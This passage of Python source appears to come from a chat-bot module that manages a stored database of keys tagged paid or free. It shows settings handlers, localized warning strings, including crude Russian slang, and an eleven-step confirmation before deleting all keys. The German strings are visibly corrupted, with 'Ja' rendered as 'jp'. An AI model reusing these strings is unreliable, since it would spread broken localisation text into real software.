        await self.ks_settings_menu(call, "view")

    async def ks_cycle_page_size(self, call):
        sizes = [4, 5, 6, 8]
        current = self._page_size()
        self._settings["list_page_size"] = sizes[(sizes.index(current) + 1) % len(sizes)]
        self._save()
        await self.ks_settings_menu(call, "view")

    async def ks_cycle_default_sort(self, call):
        modes = ["recent", "alpha", "provider", "tier"]
        current = self._normalize_sort_mode(self._settings.get("default_sort"))
        self._settings["default_sort"] = modes[(modes.index(current) + 1) % len(modes)]
        self._save()
        await self.ks_settings_menu(call, "view")

    def _confirm_locale(self):
        clear_label = self.strings.get("btn_clear", "")
        check_all_label = self.strings.get("btn_check_all", "")
        if "клир ол" in clear_label:
            return "tiktok"
        if "cl34r 4ll" in clear_label:
            return "leet"
        if "cweaw aww" in clear_label:
            return "uwu"
        if "全削除" in clear_label:
            return "jp"
        if "Alles löschen" in clear_label:
            return "de"
        if "Очистити все" in clear_label:
            return "uk"
        if "Очистить все" in clear_label:
            return "ru"
        if check_all_label == "Check All":
            return "neofit"
        return "en"

    def _confirm_profile(self):
        locale = self._confirm_locale()
        profiles = {
            "en": {
                "clear_all_warnings": [
                    "⚠️ This will erase the whole key database.",
                    "⚠️ Paid, free and unknown keys will all be removed.",
                    "⚠️ Export presets and stats will have nothing left to show.",
                    "⚠️ There is no recycle bin for this action.",
                    "⚠️ Recovery button does not exist here.",
                    "⚠️ You are about to wipe every stored key.",
                    "⚠️ If you only need part of the cleanup, go back now.",
                    "⚠️ Next click moves you closer to a full wipe.",
                    "⚠️ This is the serious part. Double-check yourself.",
                    "⚠️ Last checkpoint before the final confirmation.",
                    "⚠️ Final warning. The database will be deleted right after confirmation.",
                ],
                "clear_step_buttons": [
                    "I got it, continue",
                    "Still continue",
                    "Yes, keep going",
                    "I understand the risk",
                    "No rollback, continue",
                    "Continue anyway",
                    "I still want this",
                    "Yes, next step",
                    "Still sure",
                    "One last step",
                ],
                "clear_final_yes": "YES, DELETE EVERYTHING",
                "clear_paid_confirm": "⚠️ This will delete all paid keys from the database.",
                "clear_free_confirm": "⚠️ This will delete all free keys from the database.",
                "clear_paid_yes": "Yes, delete paid keys",
                "clear_free_yes": "Yes, delete free keys",
            },
            "ru": {
                "clear_all_warnings": [
                    "⚠️ Это снесет вообще всю базу ключей.",
                    "⚠️ Платные, бесплатные и unknown ключи исчезнут сразу все.",
                    "⚠️ После этого в экспорте и стате показывать будет уже нечего.",
                    "⚠️ Отката тут нет. Вообще.",
                    "⚠️ Корзины тоже нет, вернуть кнопкой не получится.",
                    "⚠️ Сейчас ты реально идешь на полный вайп базы.",
                    "⚠️ Если хотел удалить только часть ключей, самое время вернуться назад.",
                    "⚠️ Следующий клик еще ближе к тотальному удалению.",
                    "⚠️ Это уже серьёзное подтверждение, не машинально жми.",
                    "⚠️ Последний чекпоинт перед финалом.",
                    "⚠️ Финальное предупреждение. После подтверждения база удалится сразу.",
                ],
                "clear_step_buttons": [
                    "Ладно, дальше",
                    "Да, продолжаем",
                    "Я понял, дальше",
                    "Риск понял, жми дальше",
                    "Да, без отката",
                    "Все равно дальше",
                    "Да, я все еще уверен",
                    "Окей, следующий этап",
                    "ДА, Я УВЕРЕН",
                    "ДА, Я 100% УВЕРЕН",
                ],
                "clear_final_yes": "ДА, УДАЛИТЬ ВСЁ НАХРЕН",
                "clear_paid_confirm": "⚠️ Это удалит все платные ключи из базы.",
                "clear_free_confirm": "⚠️ Это удалит все бесплатные ключи из базы.",
                "clear_paid_yes": "Да, удалить платные",
                "clear_free_yes": "Да, удалить бесплатные",
            },
            "uk": {
                "clear_all_warnings": [
                    "⚠️ Це знесе всю базу ключів повністю.",
                    "⚠️ Платні, безкоштовні та невідомі ключі зникнуть всі разом.",
                    "⚠️ Після цього експорт і статистика вже нічого не покажуть.",
                    "⚠️ Відкату для цієї дії немає.",
                    "⚠️ Кошика теж немає, повернути не вийде.",
                    "⚠️ Ти реально йдеш на повний вайп бази.",
                    "⚠️ Якщо хотів стерти лише частину, зараз саме час повернутись.",
                    "⚠️ Наступний клік ще ближче до тотального видалення.",
                    "⚠️ Це вже серйозне підтвердження, не тисни машинально.",
                    "⚠️ Останній чекпойнт перед фіналом.",
                    "⚠️ Фінальне попередження. Після підтвердження база зникне одразу.",
                ],
                "clear_step_buttons": [
                    "Гаразд, далі",
                    "Так, продовжити",
                    "Я зрозумів, далі",
                    "Ризик зрозумілий",
                    "Без відкату, далі",
                    "Все одно далі",
                    "Так, я все ще впевнений",
                    "Добре, наступний крок",
                    "ТАК, Я ВПЕВНЕНИЙ",
                    "ТАК, Я 100% ВПЕВНЕНИЙ",
                ],
                "clear_final_yes": "ТАК, ВИДАЛИТИ ВСЕ",
                "clear_paid_confirm": "⚠️ Це видалить усі платні ключі з бази.",
                "clear_free_confirm": "⚠️ Це видалить усі безкоштовні ключі з бази.",
                "clear_paid_yes": "Так, видалити платні",
                "clear_free_yes": "Так, видалити безкоштовні",
            },
            "de": {
                "clear_all_warnings": [
                    "⚠️ Das löscht die komplette Schlüsseldatenbank.",
                    "⚠️ Bezahlte, kostenlose und unbekannte Schlüssel werden alle entfernt.",
                    "⚠️ Danach bleiben Export und Statistik leer.",
                    "⚠️ Für diese Aktion gibt es kein Zurück.",
                    "⚠️ Es gibt auch keinen Papierkorb zum Wiederherstellen.",
                    "⚠️ Du bist gerade auf dem Weg zu einem vollständigen Datenbank-Wipe.",
                    "⚠️ Wenn du nur teilweise aufräumen wolltest, geh jetzt zurück.",
                    "⚠️ Der nächste Klick bringt dich direkt vor den Vollwipe.",
                    "⚠️ Das ist jetzt die ernste Bestätigung. Nicht blind weiterdrücken.",
                    "⚠️ Letzter Kontrollpunkt vor dem Finale.",
                    "⚠️ Letzte Warnung. Nach der Bestätigung ist die DB sofort weg.",
                ],
                "clear_step_buttons": [
                    "Verstanden, weiter",
                    "jp, weiter",
                    "Risiko verstanden",
                    "Trotzdem weiter",
                    "Ohne Rückweg, weiter",
                    "Ich will fortfahren",
                    "jp, ich bin sicher",
                    "Nächster Schritt",
                    "jp, ICH BIN SICHER",
                    "jp, ICH BIN 100% SICHER",
                ],
                "clear_final_yes": "jp, ALLES LÖSCHEN",
                "clear_paid_confirm": "⚠️ Das löscht alle bezahlten Schlüssel aus der Datenbank.",
                "clear_free_confirm": "⚠️ Das löscht alle kostenlosen Schlüssel aus der Datenbank.",
                "clear_paid_yes": "jp, bezahlte löschen",
                "clear_free_yes": "jp, kostenlose löschen",
            },
            "jp": {
                "clear_all_warnings": [
                    "⚠️ これはキーDBを丸ごと削除します。",
                    "⚠️ 有料・無料・不明キーがすべて消えます。",
                    "⚠️ この後は統計もエクスポートも空になります。",
                    "⚠️ この操作に取り消しはありません。",
                    "⚠️ ゴミ箱もなく、あとで戻せません。",
                    "⚠️ 今やろうとしているのは完全なDBワイプです。",
                    "⚠️ 一部だけ消したいなら今戻るべきです。",
                    "⚠️ 次のタップで完全削除の直前まで進みます。",
                    "⚠️ ここからは本気の確認です。勢いで押さないでください。",
                    "⚠️ これが最後のチェックポイントです。",
                    "⚠️ 最終警告です。確認した瞬間にDBが消えます。",
                ],
                "clear_step_buttons": [
                    "理解した、進む",
                    "まだ進む",
                    "はい、続ける",
                    "リスクは理解した",
                    "戻せなくても進む",
                    "それでも進む",
                    "まだ削除したい",
                    "次へ進む",
                    "はい、本当に確実",
                    "はい、100%確実",
                ],
                "clear_final_yes": "はい、全部削除する",
                "clear_paid_confirm": "⚠️ これは有料キーをすべて削除します。",
                "clear_free_confirm": "⚠️ これは無料キーをすべて削除します。",
                "clear_paid_yes": "はい、有料キーを削除",
                "clear_free_yes": "はい、無料キーを削除",
            },
            "neofit": {
                "clear_all_warnings": [
                    "⚠️ Boss, this nukes the whole key base.",
                    "⚠️ Paid, free and unknown keys all go out together.",
                    "⚠️ Stats and export will turn into empty air.",
                    "⚠️ No rollback trick here.",
                    "⚠️ No hidden recovery bin either.",
                    "⚠️ This is a real full wipe, not a fake scare screen.",
                    "⚠️ If you wanted partial cleanup, back out now.",
                    "⚠️ Next tap puts you right before full deletion.",
                    "⚠️ Serious confirm zone. Don't spam-click it.",
                    "⚠️ Last checkpoint, boss.",
                    "⚠️ Final warning. One confirm and the DB is gone.",
                ],
                "clear_step_buttons": [
                    "Okay boss, next",
                    "Still going",
                    "Risk accepted",
                    "Yeah continue",
                    "No rollback, next",
                    "Do it anyway",
                    "Yep, still sure",
                    "One more step",
                    "YES BOSS IM SURE",
                    "YES 100% SURE",
                ],
                "clear_final_yes": "YES, WIPE THE WHOLE DB",
                "clear_paid_confirm": "⚠️ This deletes all paid keys from the key base.",
                "clear_free_confirm": "⚠️ This deletes all free keys from the key base.",
                "clear_paid_yes": "Yeah, delete paid",
                "clear_free_yes": "Yeah, delete free",
            },
            "tiktok": {
                "clear_all_warnings": [
                    "⚠️ ща снесёт вообще всю дб кейсов.",
                    "⚠️ пейд, фри и анноун улетят все разом.",
                    "⚠️ потом в экспорте и статах будет тупо пусто.",
                    "⚠️ отката нет, рил.",
                    "⚠️ корзины тоже нет, камбэк не завезли.",
                    "⚠️ это уже прям фулл вайп базы, без рофла.",
                    "⚠️ если хотел почистить не всё, лучше щас выйти.",
                    "⚠️ следующий тап почти финалит тотал делит.",
                    "⚠️ тут уже без автопилота, подумай ещё.",
                    "⚠️ ласт чекпоинт, брат.",
                    "⚠️ финал варн: подтверждаешь и дб улетает сразу.",
                ],
                "clear_step_buttons": [
                    "ну ок, дальше",
                    "давай дальше",
                    "понял, гоу",
                    "риск понял",
                    "без отката, гоу",
                    "всё равно гоу",
                    "да я уверен",
                    "ещё шаг",
                    "ДА БЛЯТЬ УВЕРЕН",
                    "ДА Я 100% УВЕРЕН",
                ],
                "clear_final_yes": "ДА, СНЕСТИ ВСЁ",
                "clear_paid_confirm": "⚠️ это вынесет все пейд кейсы из дб.",
                "clear_free_confirm": "⚠️ это вынесет все фри кейсы из дб.",
                "clear_paid_yes": "да, делит пейд",
                "clear_free_yes": "да, делит фри",
            },
            "leet": {
                "clear_all_warnings": [
                    "⚠️ th15 w1ll nuke th3 wh0l3 k3y d8.",
                    "⚠️ p41d, fr33 4nd unkn0wn k3y5 g0 4ll 4t 0nc3.",
                    "⚠️ 3xp0rt 4nd 5t4t5 w1ll b3 3mpty 4ft3r th15.",
                    "⚠️ n0 r0llb4ck m0d3 3x15t5 h3r3.",
                    "⚠️ n0 tr45h b1n t0 r35t0r3 1t 34th3r.",
                    "⚠️ y0u 4r3 n0w h34d1ng 1nt0 4 full d8 w1p3.",
                    "⚠️ 1f y0u w4nt3d p4rt14l cl34nup, b4ck 0ut n0w.",
                    "⚠️ n3xt cl1ck put5 y0u n34r th3 f1n4l d3l3t3.",
                    "⚠️ 53r10u5 c0nf1rm z0n3. d0nt m45h th3 butt0n.",
                    "⚠️ l45t ch3ckp01nt b3f0r3 th3 3nd.",
                    "⚠️ f1n4l w4rn1ng. c0nf1rm 4nd th3 d8 15 g0n3.",
                ],
                "clear_step_buttons": [
                    "0k n3xt",
                    "5t1ll g0",
                    "1 und3r5t4nd",
                    "r15k 4cc3pt3d",
                    "n0 r0llb4ck, n3xt",
                    "d0 1t 4nyw4y",
                    "y35 1m 5ur3",
                    "0n3 m0r3 5t3p",
                    "Y35 1M R34LLY 5UR3",
                    "Y35 100% 5UR3",
                ],
                "clear_final_yes": "Y35, D3L3T3 3V3RYTH1NG",
                "clear_paid_confirm": "⚠️ th15 d3l3t35 4ll p41d k3y5 fr0m th3 d8.",
                "clear_free_confirm": "⚠️ th15 d3l3t35 4ll fr33 k3y5 fr0m th3 d8.",
                "clear_paid_yes": "y35, d3l p41d",
                "clear_free_yes": "y35, d3l fr33",
            },
            "uwu": {
                "clear_all_warnings": [
                    "⚠️ this wiww dewete the whowe key db uwu...",
                    "⚠️ paid, fwee and unknown keys aww vanish togethew >w<",
                    "⚠️ aftew this, expowt and stats become empty :c",
                    "⚠️ thewe is no take-back button hewe uwu.",
                    "⚠️ no twash bin eithew, sowwy >.<",
                    "⚠️ this is a fuww db wipe, not a tiny cweanup.",
                    "⚠️ if you wanted onwy pawt of it gone, back now.",
                    "⚠️ next tap puts you wight befowe totaw dewete.",
                    "⚠️ sewious confirm zone now, no speed-clicking uwu.",
                    "⚠️ wast checkpoint befowe the big bonk.",
                    "⚠️ finaw wawning: confiwm and the db goes bye-bye.",
                ],
                "clear_step_buttons": [
                    "okie, next uwu",
                    "stiww continue",
                    "i get it >w<",
                    "wisk accepted",
                    "no take-backs, next",
                    "do it anyway uwu",
                    "yes, im suwe",
                    "one mowe step",
                    "YES IM WEAWWY SUWE",
                    "YES 100% SUWE",
                ],
                "clear_final_yes": "YES, DEWETE AWW",
                "clear_paid_confirm": "⚠️ this dewetes aww paid keys fwom the db uwu.",
                "clear_free_confirm": "⚠️ this dewetes aww fwee keys fwom the db uwu.",
                "clear_paid_yes": "yes, dewete paid",
                "clear_free_yes": "yes, dewete fwee",
            },
        }
        return profiles.get(locale, profiles["en"])

    def _clear_all_warnings(self):
        return list(self._confirm_profile()["clear_all_warnings"])

    def _clear_step_button(self, step: int):
        buttons = self._confirm_profile()["clear_step_buttons"]
        if not buttons:
            return self.strings.get("clear_next", "Next")
        return buttons[max(0, min(step, len(buttons) - 1))]

    def _clear_final_button(self):
        return self._confirm_profile()["clear_final_yes"]

    def _clear_paid_confirm_text(self):
        return self._confirm_profile()["clear_paid_confirm"]

    def _clear_free_confirm_text(self):
        return self._confirm_profile()["clear_free_confirm"]

    def _clear_paid_yes_text(self):
        return self._confirm_profile()["clear_paid_yes"]

    def _clear_free_yes_text(self):
        return self._confirm_profile()["clear_free_yes"]

    async def ks_clr_menu(self, call):
        paid = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
        free = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
        markup = [
            [
                self._btn(f"{self.strings['btn_del_paid']} ({paid})", self.ks_clr_paid_confirm, style="danger"),
                self._btn(f"{self.strings['btn_del_free']} ({free})", self.ks_clr_free_confirm, style="danger"),
            ],
            [self._btn(self.strings["btn_clear"], self.ks_clr_all_step, (0,), style="danger")],
            [self._btn(self.strings["btn_back"], self.ks_back, style="primary")],
        ]
        await call.edit(text=f"{self.strings['clear_menu_title']}\n{self.strings['clear_menu_subtitle']}", reply_markup=markup)

    async def ks_clr_all(self, call):
        await self.ks_clr_menu(call)

    async def ks_clr_paid_confirm(self, call):
        count = sum(1 for k in self._keys if self._paid_status.get(k) == "paid")
        if not count:
            return await call.edit(text=self.strings["empty"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]])
        markup = [
            [self._btn(self._clear_paid_yes_text(), self.ks_clr_paid_execute, style="danger")],
            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
        ]
        await call.edit(text=self._clear_paid_confirm_text(), reply_markup=markup)

    async def ks_clr_free_confirm(self, call):
        count = sum(1 for k in self._keys if self._paid_status.get(k) == "free")
        if not count:
            return await call.edit(text=self.strings["empty"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]])
        markup = [
            [self._btn(self._clear_free_yes_text(), self.ks_clr_free_execute, style="danger")],
            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
        ]
        await call.edit(text=self._clear_free_confirm_text(), reply_markup=markup)

    async def ks_clr_paid_execute(self, call):
        to_del = [k for k in list(self._keys.keys()) if self._paid_status.get(k) == "paid"]
        for k in to_del:
            self._keys.pop(k, None)
            self._paid_status.pop(k, None)
            self._key_meta.pop(k, None)
            self._ensure_model_cache().pop(k, None)
        self._save()
        msg = self.strings["clear_paid_done"].format(count=len(to_del))
        await call.edit(text=msg, reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]])

    async def ks_clr_free_execute(self, call):
        to_del = [k for k in list(self._keys.keys()) if self._paid_status.get(k) == "free"]
        for k in to_del:
            self._keys.pop(k, None)
            self._paid_status.pop(k, None)
            self._key_meta.pop(k, None)
            self._ensure_model_cache().pop(k, None)
        self._save()
        msg = self.strings["clear_free_done"].format(count=len(to_del))
        await call.edit(text=msg, reply_markup=[[self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")]])

    async def ks_clr_all_step(self, call, step=0):
        warns = self._clear_all_warnings()
        step = max(0, min(step, len(warns) - 1))
        if step < len(warns) - 1:
            markup = [
                [self._btn(self._clear_step_button(step), self.ks_clr_all_step, (step + 1,), style="danger")],
                [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
            ]
            await call.edit(text=warns[step], reply_markup=markup)
            return
        markup = [
            [self._btn(self._clear_final_button(), self.ks_clr_all_execute, style="danger")],
            [self._btn(self.strings["btn_back"], self.ks_clr_menu, style="primary")],
        ]
        await call.edit(text=warns[step], reply_markup=markup)

    async def ks_clr_all_execute(self, call):
        self._keys.clear()
        self._paid_status.clear()
        self._key_meta.clear()
        self._ensure_model_cache().clear()
        self._save()
        await call.edit(text=self.strings["clear_all_done"], reply_markup=[[self._btn(self.strings["btn_back"], self.ks_back, style="primary")]])

    async def ks_back(self, call):
        await call.edit(text=self._db_stats_text(), reply_markup=self._get_main_markup())
